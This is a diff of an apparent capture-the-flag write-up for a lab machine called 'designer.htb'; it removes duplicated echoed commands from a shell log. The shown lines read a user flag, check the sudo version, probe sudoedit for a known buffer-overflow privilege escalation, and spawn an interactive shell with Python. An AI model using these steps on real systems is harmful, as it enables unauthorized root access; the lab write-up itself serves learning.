@@ -276,13 +276,11 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
         See "man sudo_root" for details.
 
         cybercraze@designer:/var/www/subdomains/underdevelopment$ cat ~/user.txt
-        cat ~/user.txt
         c32ba831818880876035e98d868b9b70
         
 12. Privilege Escalation
 
         cybercraze@designer:/var/www/subdomains/underdevelopment$ sudo --version
-        sudo --version
         Sudo version 1.8.31
         Sudoers policy plugin version 1.8.31
         Sudoers file grammar version 46
@@ -293,7 +291,6 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
 *check if sudo is vulnerable
 
         cybercraze@designer:/var/www/subdomains/underdevelopment$ sudoedit -s Y
-        sudoedit -s Y
         sudoedit: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
 
 this cve exploits the password prompt for buffer overflow. hence we need to escalate the shell to allow the terminal to read for password
@@ -301,7 +298,6 @@ this cve exploits the password prompt for buffer overflow. hence we need to esca
         cybercraze@designer:/var/www/subdomains/underdevelopment$ python3 -c "import pty;pty.spawn('/bin/bash')"
 
         cybercraze@designer:/var/www/subdomains/underdevelopment$ sudoedit -s Y
-        sudoedit -s Y
         [sudo] password for cybercraze: --> THIS SHOWS THAT SUDOEDIT IS VULNERABLE
 
 set up the exploit and zip the whole directory
